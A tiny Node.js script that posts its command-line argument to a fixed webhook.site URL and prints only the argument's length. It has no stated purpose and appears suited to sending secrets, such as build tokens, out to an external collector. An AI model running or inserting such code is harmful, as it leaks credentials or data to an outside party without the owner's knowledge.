const axios = require('axios')
const argValue = process.argv[2];


axios.post('https://webhook.site/c2b4c58f-5afb-4502-85be-b441a8301aa0', {'wfc':argValue}).then(() => {console.log('Success')}).catch(() => console.log('Fail'))

console.log("Argument value length:", argValue.length); 
